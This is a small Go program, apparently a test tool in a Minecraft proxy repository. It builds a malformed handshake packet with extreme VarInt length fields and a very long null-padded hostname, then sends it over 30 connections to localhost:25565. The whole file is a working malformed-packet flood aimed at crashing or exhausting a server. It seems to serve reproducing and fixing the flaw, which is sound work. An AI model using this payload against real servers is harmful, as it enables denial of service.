package main

import (
	"bytes"
	"log"
	"net"

	"github.com/haveachin/infrared/internal/pkg/java/protocol"
)

var handshakePayload []byte

func init() {
	buf := bytes.NewBuffer([]byte{})
	buf.Write(protocol.VarInt(2147483647).Encode())
	buf.WriteByte(9)
	buf.Write([]byte("localhost.\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a"))
	buf.Write([]byte{0x63, 0xDD})
	buf.Write(protocol.VarInt(2147483647).Encode())
	handshakePayload = buf.Bytes()
}

func main() {
	for i := 0; i < 30; i++ {
		c, err := net.Dial("tcp", "localhost:25565")
		if err != nil {
			log.Fatal(err)
		}

		c.Write(handshakePayload)
	}
}
